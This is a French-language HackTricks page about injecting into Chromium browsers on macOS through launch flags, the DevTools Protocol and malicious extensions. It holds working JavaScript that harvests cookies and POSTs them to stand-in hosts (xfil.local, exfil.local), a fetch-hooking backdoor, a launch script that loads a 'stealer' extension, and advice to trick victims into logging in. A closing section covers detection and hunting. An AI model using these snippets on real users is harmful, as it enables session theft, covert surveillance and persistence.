# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Les navigateurs basés sur Chromium, comme Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi et Opera, utilisent tous les mêmes switches de ligne de commande, fichiers de préférences et interfaces d'automatisation DevTools. Sur macOS, tout utilisateur disposant d'un accès GUI peut terminer une session de navigateur existante et la rouvrir avec des flags, des extensions ou des endpoints DevTools arbitraires qui s'exécutent avec les entitlements de la cible.

#### Lancer Chromium avec des flags personnalisés sur macOS

macOS conserve une instance UI unique par profil Chromium. L'instrumentation nécessite donc généralement de forcer la fermeture du navigateur (par exemple avec `osascript -e 'tell application "Google Chrome" to quit'`). Les attaquants relancent généralement le navigateur via `open -na "Google Chrome" --args <flags>` afin d'injecter des arguments sans modifier l'app bundle. Le fait d'envelopper cette commande dans un LaunchAgent utilisateur (`~/Library/LaunchAgents/*.plist`) ou un login hook garantit que le navigateur altéré est relancé après un redémarrage ou une déconnexion.

#### Flag `--load-extension`

Le flag `--load-extension` charge automatiquement des extensions décompressées (chemins séparés par des virgules). Associez-le à `--disable-extensions-except` pour bloquer les extensions légitimes tout en forçant l'exécution de votre payload uniquement. Les extensions malveillantes peuvent demander des permissions à fort impact telles que `debugger`, `webRequest` et `cookies` afin de pivoter vers les protocoles DevTools, modifier les headers CSP, rétrograder HTTPS ou exfiltrer des éléments de session dès le démarrage du navigateur.

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Ces switches exposent le Chrome DevTools Protocol (CDP) via TCP ou un pipe afin que des outils externes puissent piloter le navigateur. Google a observé un usage généralisé de cette interface par des infostealers et, depuis Chrome 136 (mars 2025), les switches sont ignorés pour le profil par défaut, sauf si le navigateur est lancé avec un `--user-data-dir` non standard. Cela applique l'App-Bound Encryption aux profils réels, mais les attaquants peuvent toujours créer un profil vierge, pousser la victime à s'y authentifier (avec l'aide de phishing/triage), puis récupérer des cookies, des tokens, des états de confiance de l'appareil ou des inscriptions WebAuthn via CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Ce flag redirige l'intégralité du profil du navigateur (History, Cookies, Login Data, fichiers de préférences, etc.) vers un chemin contrôlé par l'attaquant. Il est obligatoire lors de l'utilisation de builds modernes de Chrome avec `--remote-debugging-port` et permet également de maintenir le profil altéré isolé afin d'y déposer des fichiers `Preferences` ou `Secure Preferences` préconfigurés qui désactivent les invites de sécurité, installent automatiquement des extensions et modifient les schémas par défaut.

#### Flag `--use-fake-ui-for-media-stream`

Ce switch contourne l'invite d'autorisation de la caméra et du microphone afin que toute page appelant `getUserMedia` obtienne immédiatement l'accès. Combinez-le avec des flags tels que `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ou des commandes CDP `Browser.grantPermissions` pour capturer silencieusement l'audio/vidéo, partager le bureau ou satisfaire les vérifications de permissions WebRTC sans interaction de l'utilisateur.

## Schémas de livraison et de relance observés dans la nature

L'abus de CDP constitue généralement une étape de **post-exploitation**, plutôt que le payload initial. Une campagne macOS récente ciblant les développeurs utilisait une phase de build Xcode **`Run Script`** empoisonnée (`PBXShellScriptBuildPhase`) afin que le code ne s'exécute que lorsque la victime **compilait** le projet, et non lorsqu'elle le clonait ou l'ouvrait simplement. Après cette première exécution, le malware infectait également d'autres arborescences `.xcodeproj`, ajoutait des hooks Git `pre-commit` malveillants et recherchait d'autres projets Xcode dans les archives ZIP.<sup>[[3]](#references)</sup>

Pour l'abus de Chromium, cela est important car l'attaquant n'a pas besoin de patcher le binaire du navigateur lui-même. Un stager de phase de build / `osascript` à courte durée de vie peut plutôt installer un **browser wrapper** (LaunchAgent, login item, entrée du Dock, app launcher trojanisé, etc.) qui rouvre le navigateur légitime avec des flags contrôlés par l'attaquant chaque fois que l'utilisateur le démarre.<sup>[[3]](#references)</sup>

> [!TIP]
> Sur les endpoints de développeurs, inspectez les fichiers `.pbxproj`, `.git/hooks/pre-commit` et les ZIP contenant `.xcodeproj` à la recherche de `curl`, `osascript`, `xxd`, de `base64` imbriqués ou d'une logique de relance de Chrome inattendus.

## Abus du Remote Debugging et du DevTools Protocol

Une fois que Chrome est relancé avec un `--user-data-dir` dédié et un `--remote-debugging-port`, vous pouvez vous connecter via CDP (par exemple avec `chrome-remote-interface`, `puppeteer` ou `playwright`) et scripter des workflows à privilèges élevés :

- **Vol de cookies/session :** `Network.getAllCookies` et `Storage.getCookies` renvoient les valeurs HttpOnly, même lorsque l'App-Bound encryption bloquerait normalement l'accès au système de fichiers, car CDP demande au navigateur en cours d'exécution de les déchiffrer.
- **Altération des permissions :** `Browser.grantPermissions` et `Emulation.setGeolocationOverride` permettent de contourner les invites de la caméra et du microphone (notamment avec `--use-fake-ui-for-media-stream`) ou de falsifier les contrôles de sécurité fondés sur la localisation.
- **Injection de frappes/scripts :** `Runtime.evaluate` exécute du JavaScript arbitraire dans l'onglet actif, ce qui permet de récupérer des identifiants, de modifier le DOM ou d'injecter des beacons de persistence qui survivent à la navigation.<sup>[[1]](#references)</sup>
- **Exfiltration en temps réel :** `Network.webRequestWillBeSentExtraInfo` et `Fetch.enable` interceptent les requêtes/réponses authentifiées en temps réel sans toucher aux artefacts présents sur le disque.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Parce que Chrome 136 bloque CDP sur le profil par défaut, copier le répertoire existant `~/Library/Application Support/Google/Chrome` de la victime vers un chemin de staging ne permet plus d'obtenir des cookies déchiffrés. À la place, faites du social engineering auprès de l'utilisateur afin qu'il s'authentifie dans le profil instrumenté (par exemple, pendant une session de support « utile »), ou capturez les tokens MFA en transit via des network hooks contrôlés par CDP.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Un pattern de malware pratique consiste à :

1. Redémarrer l'implant ou le wrapper userland à chaque lancement de Chrome.
2. Lancer le navigateur légitime avec `--remote-debugging-port=<port>` et, sur Chrome 136+, généralement avec un `--user-data-dir=<dir>` associé et non par défaut.
3. Démarrer un helper qui se connecte au WebSocket CDP local et enregistre un pre-document hook avec `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Ce helper peut injecter du JavaScript **avant** l'exécution du code du site, ce qui est idéal pour hooker `window.fetch`, `XMLHttpRequest`, les wallet providers ou les flux d'autofill sans modifier les fichiers sur le disque.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Une variante plus puissante transforme le navigateur en **passerelle de commandes host** : le JavaScript injecté émet un `console.log` marqué par un délimiteur, l'helper local surveille `Runtime.consoleAPICalled`, supprime le marqueur, exécute le reste via le shell host (par exemple `exec.Command` de Go), puis renvoie stdout/stderr via le WebSocket de l'attaquant. Cela transforme l'exécution de scripts au niveau de l'onglet en reverse shell essentiellement fileless.<sup>[[3]](#references)</sup>

## Injection via Extension avec l'API Debugger

La recherche « Chrowned by an Extension » de 2023 a démontré qu'une extension malveillante utilisant l'API `chrome.debugger` peut s'attacher à n'importe quel onglet et obtenir les mêmes pouvoirs DevTools que `--remote-debugging-port`.<sup>[[6]](#references)</sup> Cela brise les hypothèses d'isolation initiales (les extensions restent dans leur contexte) et permet :

- Le vol silencieux de cookies et d'identifiants avec `Network.getAllCookies`/`Fetch.getResponseBody`.
- La modification des permissions des sites (caméra, microphone, géolocalisation) et le contournement des interstitiels de sécurité, permettant aux pages de phishing d'imiter les boîtes de dialogue de Chrome.
- La falsification on-path des avertissements TLS, des téléchargements ou des invites WebAuthn en pilotant programmatiquement `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ou `Security.handleCertificateError`.

Chargez l'extension avec `--load-extension`/`--disable-extensions-except` afin qu'aucune interaction de l'utilisateur ne soit requise. Un script d'arrière-plan minimal qui weaponize l'API ressemble à ceci :
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L’extension peut également s’abonner aux événements `Debugger.paused` afin de lire les variables JavaScript, de patcher les scripts inline ou de déposer des points d’arrêt personnalisés qui persistent lors de la navigation. Comme tout s’exécute dans la session GUI de l’utilisateur, Gatekeeper et TCC ne sont pas déclenchés, ce qui rend cette technique idéale pour un malware ayant déjà obtenu une exécution dans le contexte de l’utilisateur.<sup>[[6]](#references)</sup>

## Détection & Hunting

- Déclenchez une alerte lorsque des navigateurs Chromium sont lancés avec `--remote-debugging-port`, `--remote-debugging-pipe` ou un `--user-data-dir` suspect, en particulier lorsque le parent est `bash`, `sh`, `osascript`, `xcodebuild` ou un helper LaunchAgent.
- Recherchez les chaînes courtes dans lesquelles un helper ouvre un WebSocket CDP local, enregistre `Page.addScriptToEvaluateOnNewDocument`, puis établit une connexion WebSocket/HTTPS sortante de longue durée.
- Recherchez les bridges console-to-shell en corrélant l’activité `Runtime.consoleAPICalled` du navigateur avec des shells enfants ou des processus helper exécutant des commandes fournies par l’attaquant.
- Sur les Mac de développeurs, examinez les entrées `PBXShellScriptBuildPhase` des fichiers `.pbxproj`, les hooks Git `pre-commit`, les relanceurs du Dock et des éléments de connexion, ainsi que les projets Xcode contenus dans des ZIP pour détecter l’installation de browser wrappers.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Outils

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatise les lancements de Chromium avec des extensions de payload et expose des hooks CDP interactifs.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Outil similaire axé sur l’interception du trafic et l’instrumentation du navigateur pour les opérateurs macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bibliothèque Node.js permettant de scripter les dumps du Chrome DevTools Protocol (cookies, DOM, permissions) une fois qu’une instance `--remote-debugging-port` est active.

### Exemple
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trouvez davantage d'exemples dans les liens des tools.

## Références

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
